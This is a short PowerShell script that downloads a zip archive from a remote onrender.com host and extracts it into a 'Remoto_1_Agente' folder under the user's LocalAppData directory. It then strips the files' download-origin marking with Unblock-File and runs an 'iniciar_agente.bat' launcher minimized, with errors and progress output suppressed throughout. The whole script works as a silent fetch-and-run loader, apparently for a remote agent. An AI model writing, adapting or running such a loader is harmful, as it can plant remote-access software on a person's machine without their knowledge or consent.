$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'

$urlBase = 'https://remoto-1.onrender.com'
$carpetaDestino = Join-Path $env:LOCALAPPDATA 'Remoto_1_Agente'
$rutaZip = Join-Path $env:TEMP 'Remoto_1.zip'

if (-not (Test-Path $carpetaDestino)) {
    New-Item -ItemType Directory -Path $carpetaDestino -Force | Out-Null
}

Invoke-WebRequest -Uri "$urlBase/Remoto_1.zip" -OutFile $rutaZip
Expand-Archive -Path $rutaZip -DestinationPath $carpetaDestino -Force
Get-ChildItem -Path $carpetaDestino -Recurse | Unblock-File -ErrorAction SilentlyContinue

$bat = Join-Path $carpetaDestino 'iniciar_agente.bat'
if (Test-Path $bat) {
    Start-Process -FilePath 'cmd.exe' -ArgumentList "/c `"$bat`"" -WorkingDirectory $carpetaDestino -WindowStyle Minimized
}
